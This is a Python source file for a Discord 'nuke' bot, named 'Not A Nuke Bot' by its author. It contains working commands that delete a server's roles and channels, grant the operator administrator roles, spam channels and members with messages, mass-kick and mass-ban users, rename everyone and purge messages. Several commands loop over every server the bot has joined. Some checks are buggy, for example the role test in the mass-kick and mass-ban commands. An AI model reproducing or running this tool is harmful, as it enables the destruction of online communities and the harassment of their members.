import discord
import pandas as pd
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=commands.when_mentioned_or('.'), intents=intents)
client.remove_command('help')

# Change underneath
default_role_name = "Member"
name_of_bot = 'Not A Nuke Bot'

ns_cool_down = 0
leader_id = 367132304167927810
dm_messages = "frick u"
channel_name = "poop"
number_of_channels = '5'
nuker_leader_role_name = 'Nuker Leader'
nuker_role_name = 'Nuker'
del_roles = True
create_nuke_roles = True
del_channels = True
create_channels = True
dm_people = False
nuker_variables = [dm_messages, channel_name, number_of_channels, leader_id, name_of_bot, nuker_leader_role_name,
                   del_roles, create_nuke_roles, del_channels, create_channels, dm_people]


# Change this ^^^^^^


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Bot Online!'))
    print('Bot is online.')


@client.command(pass_context=True)
@commands.has_role(nuker_leader_role_name)
async def spam(ctx, arg, user: discord.User, *, message=None):
    message = message or "Spam"
    arg = int(arg) or 1
    for x in range(arg):
        await user.send(message)
    await ctx.send(f"{user.mention} got spammed {arg} time(s)!")
    print(f'{ctx.message.author} used the command "SPAM"!')


@client.command(pass_context=True, aliases=['spamc'])
@commands.has_role(nuker_leader_role_name)
async def spamchannel(ctx, arg, *, message=None):
    message = message or "Spam"
    arg = int(arg) or 1
    for x in range(arg):
        await ctx.send(message)
    await ctx.send(f"You spammed {message} {arg} time(s)!")
    print(f'{ctx.message.author} used the command "SPAM CHANNEL"!')


@client.command(pass_context=True)
@commands.has_role(nuker_leader_role_name)
async def msgu(ctx, user: discord.User, *, message=None):
    await user.send(message)
    await ctx.send(f'You have sent to {user.mention}: {message}')
    print(f'{ctx.message.author} used the command "MESSAGE USER"!')


# make it so you can turn some parts of the commands off
@client.command(pass_context=True, aliases=['ns'])
@commands.cooldown(1, ns_cool_down, commands.BucketType.default)
async def nukestart(ctx):
    # import variables
    global nuker_variables
    guild = ctx.guild
    # check author id
    if ctx.message.author.id == leader_id:
        print('Nuking Starting')
        await ctx.message.delete()

        if del_roles:
            # make list of role
            role_list = []
            for guild_ in ctx.guild.roles:
                role_list.append(guild_.id)
            df_role = pd.DataFrame(role_list)
            bot_role = discord.utils.get(ctx.guild.roles, name=name_of_bot)
            default_role_id = discord.utils.get(ctx.guild.roles, name='@everyone')
            def_role = discord.utils.get(ctx.guild.roles, name=default_role_name)
            # check roles
            for num in range(len(role_list)):
                if int(df_role[0][int(num)]) != default_role_id.id:
                    if int(df_role[0][int(num)]) != bot_role.id:
                        if int(df_role[0][int(num)]) != def_role.id:
                            del_role = discord.utils.get(ctx.message.guild.roles, id=int(df_role[0][num]))
                            try:
                                # deletes roles
                                await del_role.delete()
                                print(f'The role "{del_role}" got deleted!')
                            except:
                                print(f'Role "{del_role}" could not get deleted!')

        if create_nuke_roles:
            # creates Nuker Leader Role
            perms = discord.Permissions(administrator=True)
            await guild.create_role(name=nuker_leader_role_name, permissions=perms)
            print(f'"{nuker_leader_role_name}" role was created!')
            role = discord.utils.get(ctx.guild.roles, name=nuker_leader_role_name)
            # adds Nuker Leader Role to author
            author = ctx.message.author
            await author.add_roles(role)
            print(f'Role "{nuker_leader_role_name}" was given to {author}!')
            # creates Nuker Role
            await guild.create_role(name=nuker_role_name, permissions=perms)
            print(f'"{nuker_role_name}" role was created!')

        # make list of channels
        channel_list = []
        for guild_ in client.guilds:
            for channel in guild_.channels:
                channel_list.append(channel.id)

        if del_channels:
            # deletes channels
            df_channel = pd.DataFrame(channel_list)
            for num in range(len(channel_list)):
                channel_del = client.get_channel(int(df_channel[0][num]))
                try:
                    await channel_del.delete()
                    print(f'Channel "{channel_del.name}" got deleted!')
                except:
                    print(f'Channel "{channel_del.name}" could not get deleted!')

        if create_channels:
            # creates channels
            for x in range(int(number_of_channels)):
                try:
                    await guild.create_text_channel(channel_name)
                    print(f'Channel "{channel_name}" was created!')
                except:
                    print(f'Channel"{channel_name}" could not get created!')

        if dm_people:
            # dms everyone
            members = ctx.guild.members
            for member_ in members:
                try:
                    await member_.send(dm_messages)
                    print(f'Message "{dm_messages}" got sent to "{member_.name}"!')
                except:
                    print(f'Could not send "{dm_messages}" got sent to "{member_.name}"!')

        print('Nuking Begins')
    else:
        print(f'"{ctx.message.author}" is trying to nuke the server!')
    print(f'{ctx.message.author} used the command "NUKE SERVER"!')


@client.command()
async def t(ctx):
    for guild in client.guilds:
        for channel in guild.channels:
            print(channel)


# make it if no nuker leader role was made, it would make it
@client.command(pass_context=True, aliases=['nlr'])
async def nukerleaderrole(ctx, member: discord.Member = None):
    await ctx.message.delete()
    member = ctx.message.author
    nuker_leader_role = discord.utils.get(ctx.guild.roles, name=nuker_leader_role_name)
    if ctx.message.author.id == leader_id:
        try:
            await member.add_roles(nuker_leader_role)
            print(f'Gave "{nuker_leader_role}" to "{member}"!')
        except:
            print(f'Could not give "{nuker_leader_role}" to "{member}"!')
        print(f'{ctx.message.author} used the command "NUKE LEADER ROLE"!')
    else:
        print(f'"{ctx.message.author}" tried to use "NUKE LEADER ROLE" command!')


# make it if no nuker role or nuker leader role was made, it would make both or just nuker role
@client.command(pass_context=True, aliases=['nr'])
@commands.has_role(nuker_leader_role_name)
async def nukerrole(ctx, member: discord.Member):
    await ctx.message.delete()
    nuke_role = discord.utils.get(ctx.guild.roles, name=nuker_role_name)
    try:
        await member.add_roles(nuke_role)
        print(f'Gave "{nuke_role}" to "{member}"!')
    except:
        print(f'Could not give "{nuke_role}" to "{member}"!')
    print(f'{ctx.message.author} used the command "NUKE ROLE"!')


@client.command(pass_context=True, aliases=['gr'])
@commands.has_role(nuker_leader_role_name)
async def giverole(ctx, member: discord.Member, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    try:
        await member.add_roles(role)
        print(f'Gave "{role}" to "{member}"!')
    except:
        print(f'Could not give "{role}" to "{member}"!')
    print(f'{ctx.message.author} used the command "GIVE ROLE"!')


@client.command(pass_context=True, aliases=['mk'])
@commands.has_role(nuker_leader_role_name)
async def masskick(ctx):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=nuker_role_name)
    role1 = discord.utils.get(ctx.guild.roles, name=nuker_leader_role_name)
    for user in list(ctx.guild.members):
        if role.id or role1.id not in user.roles:
            try:
                await user.kick()
                print(f'"{user}" got kicked!')
            except:
                print(f'Could not ban "{user}"!')
    print(f'{ctx.message.author} used the command "MASS KICK"!')


@client.command(pass_context=True, aliases=['mb'])
@commands.has_role(nuker_leader_role_name)
async def massban(ctx):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=nuker_role_name)
    role1 = discord.utils.get(ctx.guild.roles, name=nuker_leader_role_name)
    for user in list(ctx.guild.members):
        if role.id or role1.id not in user.roles:
            try:
                await user.ban()
                print(f'"{user}" got banned!')
            except:
                print(f'Could not ban "{user}"!')
    print(f'{ctx.message.author} used the command "MASS BAN"!')


@client.command(pass_context=True, aliases=['md'])
@commands.has_role(nuker_leader_role_name)
async def massdm(ctx, count=None, *, message):
    await ctx.message.delete()
    members = ctx.guild.members
    count = 1
    for member in members:
        for num in range(count):
            try:
                await member.send(message)
                print(f'"{message}" got sent to "{member}"!')
            except:
                print(f'Could not send "{message}" got sent to "{member}"!')
    print(f'{ctx.message.author} used the command "MASS DM"!')


@client.command(pass_context=True, aliases=['mm'])
@commands.has_role(nuker_leader_role_name)
async def massmessage(ctx, count=None, *, message):
    await ctx.message.delete()
    text_channel_list = []
    count = 1
    for guild_ in client.guilds:
        for channel in guild_.text_channels:
            text_channel_list.append(channel.id)
    for num in range(len(text_channel_list)):
        for times in range(count):
            channel = client.get_channel(text_channel_list[num])
            try:
                await channel.send(message)
                print(f'"{message}" has been sent to "{channel.name}"!')
            except:
                print(f'Could not send "{message}" to "{channel.name}"!')
    print(f'{ctx.message.author} used the command "MASS MESSAGE"!')


@client.command(pass_context=True, aliases=['mc'])
@commands.has_role(nuker_leader_role_name)
async def massclear(ctx, count=None):
    await ctx.message.delete()
    text_channel_list = []
    count = 5
    for guild_ in client.guilds:
        for channel in guild_.text_channels:
            text_channel_list.append(channel.id)
    for num in range(len(text_channel_list)):
        channel = client.get_channel(text_channel_list[num])
        await channel.purge(limit=count)
        print(f'"{ctx.message.author}" deleted "{count}" of messages in "{channel.name}"')


@client.command()
@commands.has_role(nuker_leader_role_name)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.send(f"{ctx.message.author.mention} has kicked out of the server for: {reason}.")
    await member.kick(reason=reason)
    await ctx.send(f"{member.mention} has been kicked for: {reason}.")


@client.command()
@commands.has_role(nuker_leader_role_name)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.send(f"{ctx.message.author.mention} has banned you from server for: {reason}.")
    await member.ban(reason=reason)
    await ctx.send(f"{member.mention} has been banned for: {reason}.")


@client.command(pass_context=True, aliases=['na'])
@commands.has_role(nuker_leader_role_name)
async def nickall(ctx, nick):
    await ctx.message.delete()
    members = ctx.guild.members
    for member in members:
        try:
            await member.edit(nick=nick)
            print(f'User "{member}" have been renamed to "{nick}"!')
        except:
            print(f'Could not rename user "{member}" to "{nick}"!')
    print(f'{ctx.message.author} used the command "NICK ALL"!')


@client.command(pass_context=True, aliases=['ran'])
@commands.has_role(nuker_leader_role_name)
async def resetallnick(ctx):
    await ctx.message.delete()
    members = ctx.guild.members
    for member in members:
        name = member.name
        try:
            await member.edit(nick=name)
            print(f'User "{member}" have been renamed to "{name}"!')
        except:
            print(f'Could not rename user "{member}" to "{name}"!')
    print(f'{ctx.message.author} used the command "RESET ALL NICK"!')


@client.command(pass_context=True, aliases=["l"])
@commands.has_role(nuker_leader_role_name)
async def lock(ctx):
    await ctx.message.delete()
    global default_role_name
    role = discord.utils.get(ctx.guild.roles, name=default_role_name)
    await ctx.channel.set_permissions(role, send_messages=False)
    print(f'{ctx.message.author} used the command "LOCK" to channel "{ctx.message.channel}"!')


@client.command(pass_context=True, aliases=["ul"])
@commands.has_role(nuker_leader_role_name)
async def unlock(ctx):
    await ctx.message.delete()
    global default_role_name
    role = discord.utils.get(ctx.guild.roles, name=default_role_name)
    await ctx.channel.set_permissions(role, send_messages=True)
    print(f'{ctx.message.author} used the command "UNLOCK" to channel "{ctx.message.channel}"!')


@client.command(pass_context=True)
@commands.has_role(nuker_leader_role_name)
async def clear(ctx, number):
    number = 5
    await ctx.channel.purge(limit=number)
    print(f'"{ctx.message.author}" deleted "{number}" of messages in "{ctx.message.channel}"')
    print(f'{ctx.message.author} used the command "CLEAR"')


@client.command(pass_context=True)
@commands.has_role(nuker_leader_role_name)
async def info(ctx, member: discord.Member = None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(
            member.id) + "\n**The user's current status is: {}**".format(
            member.status) + "\n**The user's highest role is: {}**".format(
            member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print(f'{ctx.message.author} used the command "INFO" to "{member}"!')


client.run('')
